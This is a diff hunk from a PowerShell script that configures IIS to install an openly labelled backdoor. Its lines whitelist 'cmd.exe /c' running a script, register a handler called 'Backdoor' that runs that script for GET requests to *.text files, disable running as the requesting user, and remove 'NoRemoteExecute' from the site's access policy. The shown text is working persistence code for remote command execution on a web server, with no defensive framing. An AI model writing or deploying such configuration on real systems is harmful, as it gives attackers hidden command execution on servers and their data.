@@ -57,7 +57,7 @@ Write-Host "Done." -ForegroundColor Cyan
 Write-Host "Configuring IIS... " -ForegroundColor Cyan -NoNewline
 Write-Host "CGI... " -ForegroundColor Cyan -NoNewline
 Add-WebConfigurationProperty -pspath 'MACHINE/WEBROOT/APPHOST'  -filter "system.webServer/security/isapiCgiRestriction" -name "." -value @{path=('c:\windows\system32\cmd.exe /c "'+$scriptName+'"');allowed='True';description='BackdoorScript'}
-Set-WebConfigurationProperty -pspath 'MACHINE/WEBROOT/APPHOST' -location $siteName -filter "system.webServer/handlers" -name "accessPolicy" -value "Read,Execute,Script,NoRemoteExecute"
+Set-WebConfigurationProperty -pspath 'MACHINE/WEBROOT/APPHOST' -location $siteName -filter "system.webServer/handlers" -name "accessPolicy" -value "Read,Execute,Script"
 Add-WebConfigurationProperty -pspath 'MACHINE/WEBROOT/APPHOST' -location $siteName -filter "system.webServer/handlers" -name "." -value @{name='Backdoor';path='*.text';verb='GET';modules='CgiModule';scriptProcessor=('c:\windows\system32\cmd.exe /c "'+$scriptName+'"');resourceType='File';requireAccess='Execute'}
 Set-WebConfigurationProperty -pspath 'MACHINE/WEBROOT/APPHOST' -location "$siteName/Backdoor" -filter "system.webServer/cgi" -name "createCGIWithNewConsole" -value "True"
 Set-WebConfigurationProperty -pspath 'MACHINE/WEBROOT/APPHOST' -location "$siteName/Backdoor" -filter "system.webServer/cgi" -name "createProcessAsUser" -value "False"
